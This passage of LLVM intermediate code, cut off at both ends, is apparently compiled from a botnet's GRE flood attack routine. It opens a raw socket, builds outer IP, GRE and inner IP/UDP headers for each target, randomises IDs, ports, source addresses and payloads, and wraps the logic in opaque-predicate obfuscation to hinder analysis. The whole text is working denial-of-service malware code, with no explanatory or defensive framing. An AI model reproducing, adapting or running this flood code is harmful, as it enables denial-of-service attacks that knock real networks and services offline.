  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %659

; <label>:87:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %659

; <label>:95:                                     ; preds = %87
  %96 = load i32, i32* @x.19
  %97 = load i32, i32* @y.20
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %95
  store i32 0, i32* %11, align 4
  %104 = load i32, i32* @x.19
  %105 = load i32, i32* @y.20
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %112

; <label>:112:                                    ; preds = %326, %originalBBpart2
  %113 = load i32, i32* %11, align 4
  %114 = load i8, i8* %7, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp slt i32 %113, %115
  br i1 %116, label %117, label %329

; <label>:117:                                    ; preds = %112
  %118 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  store i8* %118, i8** %122, align 8
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = bitcast i8* %127 to %struct.iphdr*
  store %struct.iphdr* %128, %struct.iphdr** %25, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i64 1
  %131 = bitcast %struct.iphdr* %130 to %struct.grehdr*
  store %struct.grehdr* %131, %struct.grehdr** %26, align 8
  %132 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %133 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %132, i64 1
  %134 = bitcast %struct.grehdr* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %27, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.udphdr*
  store %struct.udphdr* %137, %struct.udphdr** %28, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, 15
  %142 = or i8 %141, 64
  store i8 %142, i8* %139, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = and i8 %145, -16
  %147 = or i8 %146, 5
  store i8 %147, i8* %144, align 4
  %148 = load i8, i8* %14, align 1
  %149 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 1
  store i8 %148, i8* %150, align 1
  %151 = load i32, i32* %20, align 4
  %152 = sext i32 %151 to i64
  %153 = add i64 52, %152
  %154 = trunc i64 %153 to i16
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 2
  store i16 %155, i16* %157, align 2
  %158 = load i16, i16* %15, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 3
  store i16 %159, i16* %161, align 4
  %162 = load i8, i8* %16, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  store i8 %162, i8* %164, align 4
  %165 = load i8, i8* %17, align 1
  %166 = icmp ne i8 %165, 0
  br i1 %166, label %167, label %171

; <label>:167:                                    ; preds = %117
  %168 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 4
  store i16 %168, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %117
  %172 = load i32, i32* @x.19
  %173 = load i32, i32* @y.20
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %171
  %180 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 6
  store i8 47, i8* %181, align 1
  %182 = load i32, i32* %23, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 8
  store i32 %182, i32* %184, align 4
  %185 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %186 = load i32, i32* %11, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i64 %187
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i32 0, i32 1
  %190 = load i32, i32* %189, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 9
  store i32 %190, i32* %192, align 4
  %193 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %194 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %195 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = bitcast %struct.iphdr* %196 to i8*
  %198 = load i8, i8* %197, align 4
  %199 = and i8 %198, 15
  %200 = or i8 %199, 64
  store i8 %200, i8* %197, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %202 = bitcast %struct.iphdr* %201 to i8*
  %203 = load i8, i8* %202, align 4
  %204 = and i8 %203, -16
  %205 = or i8 %204, 5
  store i8 %205, i8* %202, align 4
  %206 = load i8, i8* %14, align 1
  %207 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 1
  store i8 %206, i8* %208, align 1
  %209 = load i32, i32* %20, align 4
  %210 = sext i32 %209 to i64
  %211 = add i64 28, %210
  %212 = trunc i64 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 2
  store i16 %213, i16* %215, align 2
  %216 = load i16, i16* %15, align 2
  %217 = zext i16 %216 to i32
  %218 = xor i32 %217, -1
  %219 = trunc i32 %218 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 3
  store i16 %220, i16* %222, align 4
  %223 = load i8, i8* %16, align 1
  %224 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 5
  store i8 %223, i8* %225, align 4
  %226 = load i8, i8* %17, align 1
  %227 = icmp ne i8 %226, 0
  %228 = load i32, i32* @x.19
  %229 = load i32, i32* @y.20
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart241, label %originalBB1alteredBB

originalBBpart241:                                ; preds = %originalBB1
  br i1 %227, label %236, label %256

; <label>:236:                                    ; preds = %originalBBpart241
  %237 = load i32, i32* @x.19
  %238 = load i32, i32* @y.20
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %236
  %245 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %246 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 4
  store i16 %245, i16* %247, align 2
  %248 = load i32, i32* @x.19
  %249 = load i32, i32* @y.20
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %256

; <label>:256:                                    ; preds = %originalBBpart245, %originalBBpart241
  %257 = load i32, i32* @x.19
  %258 = load i32, i32* @y.20
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %256
  %265 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 6
  store i8 17, i8* %266, align 1
  %267 = call i32 @rand_next()
  %268 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 8
  store i32 %267, i32* %269, align 4
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = load i32, i32* @x.19
  %273 = load i32, i32* @y.20
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %271, label %280, label %286

; <label>:280:                                    ; preds = %originalBBpart249
  %281 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 9
  %283 = load i32, i32* %282, align 4
  %284 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  store i32 %283, i32* %285, align 4
  br label %310

; <label>:286:                                    ; preds = %originalBBpart249
  %287 = load i32, i32* @x.19
  %288 = load i32, i32* @y.20
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %286
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 8
  %297 = load i32, i32* %296, align 4
  %298 = sub i32 %297, 1024
  %299 = xor i32 %298, -1
  %300 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 9
  store i32 %299, i32* %301, align 4
  %302 = load i32, i32* @x.19
  %303 = load i32, i32* @y.20
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart261, label %originalBB51alteredBB

originalBBpart261:                                ; preds = %originalBB51
  br label %310

; <label>:310:                                    ; preds = %originalBBpart261, %280
  %311 = load i16, i16* %18, align 2
  %312 = call zeroext i16 @htons(i16 zeroext %311) #7
  %313 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 0
  store i16 %312, i16* %314, align 2
  %315 = load i16, i16* %19, align 2
  %316 = call zeroext i16 @htons(i16 zeroext %315) #7
  %317 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 1
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %20, align 4
  %320 = sext i32 %319 to i64
  %321 = add i64 8, %320
  %322 = trunc i64 %321 to i16
  %323 = call zeroext i16 @htons(i16 zeroext %322) #7
  %324 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 2
  store i16 %323, i16* %325, align 2
  br label %326

; <label>:326:                                    ; preds = %310
  %327 = load i32, i32* %11, align 4
  %328 = add nsw i32 %327, 1
  store i32 %328, i32* %11, align 4
  br label %112

; <label>:329:                                    ; preds = %112
  %330 = load i32, i32* @x.19
  %331 = load i32, i32* @y.20
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %329
  %338 = load i32, i32* @x.19
  %339 = load i32, i32* @y.20
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %346

; <label>:346:                                    ; preds = %originalBBpart2122, %originalBBpart265
  %347 = load i32, i32* @x.19
  %348 = load i32, i32* @y.20
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %346
  store i32 0, i32* %11, align 4
  %355 = load i32, i32* @x.19
  %356 = load i32, i32* @y.20
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %363

; <label>:363:                                    ; preds = %617, %originalBBpart269
  %364 = load i32, i32* %11, align 4
  %365 = load i8, i8* %7, align 1
  %366 = zext i8 %365 to i32
  %367 = icmp slt i32 %364, %366
  br i1 %367, label %368, label %620

; <label>:368:                                    ; preds = %363
  %369 = load i8**, i8*** %13, align 8
  %370 = load i32, i32* %11, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds i8*, i8** %369, i64 %371
  %373 = load i8*, i8** %372, align 8
  store i8* %373, i8** %29, align 8
  %374 = load i8*, i8** %29, align 8
  %375 = bitcast i8* %374 to %struct.iphdr*
  store %struct.iphdr* %375, %struct.iphdr** %30, align 8
  %376 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i64 1
  %378 = bitcast %struct.iphdr* %377 to %struct.grehdr*
  store %struct.grehdr* %378, %struct.grehdr** %31, align 8
  %379 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %380 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %379, i64 1
  %381 = bitcast %struct.grehdr* %380 to %struct.iphdr*
  store %struct.iphdr* %381, %struct.iphdr** %32, align 8
  %382 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i64 1
  %384 = bitcast %struct.iphdr* %383 to %struct.udphdr*
  store %struct.udphdr* %384, %struct.udphdr** %33, align 8
  %385 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %386 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %385, i64 1
  %387 = bitcast %struct.udphdr* %386 to i8*
  store i8* %387, i8** %34, align 8
  %388 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %389 = load i32, i32* %11, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 2
  %393 = load i8, i8* %392, align 4
  %394 = zext i8 %393 to i32
  %395 = icmp slt i32 %394, 32
  br i1 %395, label %396, label %417

; <label>:396:                                    ; preds = %368
  %397 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %398 = load i32, i32* %11, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i32 0, i32 1
  %402 = load i32, i32* %401, align 4
  %403 = call i32 @ntohl(i32 %402) #7
  %404 = call i32 @rand_next()
  %405 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %406 = load i32, i32* %11, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i32 0, i32 2
  %410 = load i8, i8* %409, align 4
  %411 = zext i8 %410 to i32
  %412 = lshr i32 %404, %411
  %413 = add i32 %403, %412
  %414 = call i32 @htonl(i32 %413) #7
  %415 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 9
  store i32 %414, i32* %416, align 4
  br label %417

; <label>:417:                                    ; preds = %396, %368
  %418 = load i32, i32* %23, align 4
  %419 = icmp eq i32 %418, -1
  br i1 %419, label %420, label %424

; <label>:420:                                    ; preds = %417
  %421 = call i32 @rand_next()
  %422 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 8
  store i32 %421, i32* %423, align 4
  br label %424

; <label>:424:                                    ; preds = %420, %417
  %425 = load i32, i32* @x.19
  %426 = load i32, i32* @y.20
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %424
  %433 = load i16, i16* %15, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  %436 = load i32, i32* @x.19
  %437 = load i32, i32* @y.20
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %435, label %444, label %475

; <label>:444:                                    ; preds = %originalBBpart273
  %445 = load i32, i32* @x.19
  %446 = load i32, i32* @y.20
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %444
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 3
  store i16 %455, i16* %457, align 4
  %458 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 3
  %460 = load i16, i16* %459, align 4
  %461 = zext i16 %460 to i32
  %462 = sub nsw i32 %461, 1000
  %463 = xor i32 %462, -1
  %464 = trunc i32 %463 to i16
  %465 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 3
  store i16 %464, i16* %466, align 4
  %467 = load i32, i32* @x.19
  %468 = load i32, i32* @y.20
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBBpart2103, label %originalBB75alteredBB

originalBBpart2103:                               ; preds = %originalBB75
  br label %475

; <label>:475:                                    ; preds = %originalBBpart2103, %originalBBpart273
  %476 = load i16, i16* %18, align 2
  %477 = zext i16 %476 to i32
  %478 = icmp eq i32 %477, 65535
  br i1 %478, label %479, label %501

; <label>:479:                                    ; preds = %475
  %480 = load i32, i32* @x.19
  %481 = load i32, i32* @y.20
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %479
  %488 = call i32 @rand_next()
  %489 = and i32 %488, 65535
  %490 = trunc i32 %489 to i16
  %491 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %492 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %491, i32 0, i32 0
  store i16 %490, i16* %492, align 2
  %493 = load i32, i32* @x.19
  %494 = load i32, i32* @y.20
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart2110, label %originalBB105alteredBB

originalBBpart2110:                               ; preds = %originalBB105
  br label %501

; <label>:501:                                    ; preds = %originalBBpart2110, %475
  %502 = load i16, i16* %19, align 2
  %503 = zext i16 %502 to i32
  %504 = icmp eq i32 %503, 65535
  br i1 %504, label %505, label %511

; <label>:505:                                    ; preds = %501
  %506 = call i32 @rand_next()
  %507 = and i32 %506, 65535
  %508 = trunc i32 %507 to i16
  %509 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %510 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %509, i32 0, i32 1
  store i16 %508, i16* %510, align 2
  br label %511

; <label>:511:                                    ; preds = %505, %501
  %512 = load i8, i8* %22, align 1
  %513 = icmp ne i8 %512, 0
  br i1 %513, label %534, label %514

; <label>:514:                                    ; preds = %511
  %515 = load i32, i32* @x.19
  %516 = load i32, i32* @y.20
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %514
  %523 = call i32 @rand_next()
  %524 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 9
  store i32 %523, i32* %525, align 4
  %526 = load i32, i32* @x.19
  %527 = load i32, i32* @y.20
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %540

; <label>:534:                                    ; preds = %511
  %535 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 9
  %537 = load i32, i32* %536, align 4
  %538 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %539 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %538, i32 0, i32 9
  store i32 %537, i32* %539, align 4
  br label %540

; <label>:540:                                    ; preds = %534, %originalBBpart2114
  %541 = load i8, i8* %21, align 1
  %542 = icmp ne i8 %541, 0
  br i1 %542, label %543, label %550

; <label>:543:                                    ; preds = %540
  %544 = load i8*, i8** %34, align 8
  %545 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %544, i32 %545)
  %546 = load i8*, i8** %34, align 8
  %547 = load i32, i32* %20, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds i8, i8* %546, i64 %548
  store i8 0, i8* %549, align 1
  br label %550

; <label>:550:                                    ; preds = %543, %540
